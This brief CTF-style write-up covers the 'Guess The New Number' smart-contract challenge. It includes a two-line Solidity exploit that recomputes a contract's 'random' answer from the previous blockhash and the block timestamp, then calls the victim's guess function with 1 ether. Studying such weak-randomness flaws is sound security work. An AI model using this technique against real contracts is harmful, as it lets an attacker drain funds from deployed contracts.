# Guess The New Number

This is another example of a contract w/ an issue using block values.

```
uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

challenge.guess{value: 1 ether}(answer);
````

The var answer solves the value that is required and then the function `guess` is called from challenge, an instance of the victim contract.